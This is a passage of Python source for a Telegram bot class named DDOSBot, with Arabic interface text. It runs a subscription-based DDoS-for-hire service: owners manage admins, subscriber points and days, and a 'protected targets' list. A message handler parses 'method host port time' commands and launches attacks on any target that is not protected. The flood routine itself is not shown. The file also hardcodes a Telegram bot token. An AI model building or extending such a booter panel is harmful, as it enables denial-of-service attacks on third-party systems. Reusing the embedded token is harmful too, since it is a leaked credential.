                        self.bot.send_message(call.message.chat.id, "لا يوجد ادمنية.")
                elif cmd == "add_owner":
                    msg = self.bot.send_message(call.message.chat.id, "[ اضافة مطور ]\n\nارسل الآيدي:")
                    self.bot.register_next_step_handler(msg, self.process_add_owner)
                elif cmd == "remove_owner":
                    owners = self.get_owners()
                    if len(owners) > 1:
                        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                        for owner in owners:
                            if owner != str(call.from_user.id):
                                markup.add(owner)
                        msg = self.bot.send_message(call.message.chat.id, "اختر المطور للحذف:", reply_markup=markup)
                        self.bot.register_next_step_handler(msg, self.process_remove_owner)
                    else:
                        self.bot.send_message(call.message.chat.id, "لا يمكن حذف آخر مطور.")
                elif cmd == "add_user":
                    msg = self.bot.send_message(call.message.chat.id, "[ اضافة نقاط لمشترك ]\n\nارسل الآيدي وعدد النقاط:\nمثال: 123456789 30")
                    self.bot.register_next_step_handler(msg, self.process_add_user)
                elif cmd == "add_days":
                    msg = self.bot.send_message(call.message.chat.id, "[ اضافة ايام لمشترك ]\n\nارسل الآيدي وعدد الايام:\nمثال: 123456789 30")
                    self.bot.register_next_step_handler(msg, self.process_add_days)
                elif cmd == "remove_user":
                    if not self.is_owner(call.from_user.id):
                        self.bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
                        return
                    msg = self.bot.send_message(call.message.chat.id, "[ ازالة مشترك ]\n\nارسل آيدي العضو:")
                    def process_remove_user(m):
                        try:
                            uid_r = str(int(m.text.strip()))
                            if self.delete_user(uid_r):
                                self.bot.reply_to(m, f"[ تم ]\n\nتم حذف العضو {uid_r} بنجاح.")
                            else:
                                self.bot.reply_to(m, "العضو غير موجود.")
                        except ValueError:
                            self.bot.reply_to(m, "آيدي غير صحيح.")
                        except Exception as ex:
                            self.bot.reply_to(m, "حدث خطأ.")
                    self.bot.register_next_step_handler(msg, process_remove_user)
                elif cmd == "dad":
                    msg = self.bot.send_message(call.message.chat.id, "[ حماية هدف ]\n\nارسل الهدف:\nمثال: 1.1.1.1 80")
                    def process_protect(m):
                        parts = m.text.split()
                        if len(parts) == 2:
                            target = f"{parts[0]}:{parts[1]}"
                            lst = self.get_protected_targets()
                            if target not in lst:
                                lst.append(target)
                                self.save_protected_targets(lst)
                            self.bot.reply_to(m, f"تم حماية {target}")
                        else:
                            self.bot.reply_to(m, "صيغة خاطئة.")
                    self.bot.register_next_step_handler(msg, process_protect)
                elif cmd == "add":
                    msg = self.bot.send_message(call.message.chat.id, "[ ازالة حماية ]\n\nارسل الهدف:\nمثال: 1.1.1.1 80")
                    def process_unprotect(m):
                        parts = m.text.split()
                        if len(parts) == 2:
                            target = f"{parts[0]}:{parts[1]}"
                            lst = self.get_protected_targets()
                            if target in lst:
                                lst.remove(target)
                                self.save_protected_targets(lst)
                                self.bot.reply_to(m, f"تم ازالة حماية {target}")
                            else:
                                self.bot.reply_to(m, "الهدف غير موجود في القائمة.")
                        else:
                            self.bot.reply_to(m, "صيغة خاطئة.")
                    self.bot.register_next_step_handler(msg, process_unprotect)
            except Exception as e:
                logger.error(f"خطأ في callback: {e}")

        @self.bot.message_handler(func=lambda message: True)
        def handle_text_message(message):
            try:
                user_id = str(message.from_user.id)

                attack_pattern = re.compile(r'^(\S+)\s+([\w\.-]+)\s+(\d{1,5})\s+(\d+)\s*$')
                match = attack_pattern.match(message.text)

                if match:
                    method, host, port_str, time_str = match.groups()
                    target = f"{host}:{port_str}"
                    if target in self.get_protected_targets():
                        self.bot.reply_to(message, f" **لا يمكن الهجوم على هذا الهدف!**\nالهدف `{target}` محمي بواسطة المطور.", parse_mode="Markdown")
                        return

                    self.process_and_run_attack(message)
            except Exception as e:
                logger.error(f"خطأ في handle_text_message: {e}")
                try:
                    self.bot.reply_to(message, " حدث خطأ أثناء معالجة الطلب.")
                except:
                    pass

    def run_with_restart(self):
        renewal_thread = threading.Thread(target=self.daily_renewal, daemon=True)
        renewal_thread.start()
        while self.running:
            try:
                print(" البوت يعمل الآن...")
                print(" استخدم Ctrl+C لإيقاف البوت")
                logger.info("بدء تشغيل البوت...")
                self.bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except KeyboardInterrupt:
                print("\n إيقاف البوت...")
                logger.info("إيقاف البوت بواسطة المستخدم")
                self.running = False
                break
            except Exception as e:
                logger.error(f"خطأ غير متوقع في البوت: {e}")
                print(f" حدث خطأ: {e}")
                print(" إعادة تشغيل البوت بعد 10 ثواني...")
                time.sleep(10)

    def stop(self):
        self.running = False
        try:
            self.bot.stop_polling()
        except:
            pass


if __name__ == "__main__":
    BOT_TOKEN = "8955576866:AAHSsyWpZiTvTygPz9ak4gmqMEDZMM-fE-s"

    try:
        bot = DDOSBot(BOT_TOKEN)
        bot.run_with_restart()
    except Exception as e:
        print(f"❌ خطأ فادح: {e}")
        logger.critical(f"خطأ فادح: {e}")
        sys.exit(1)
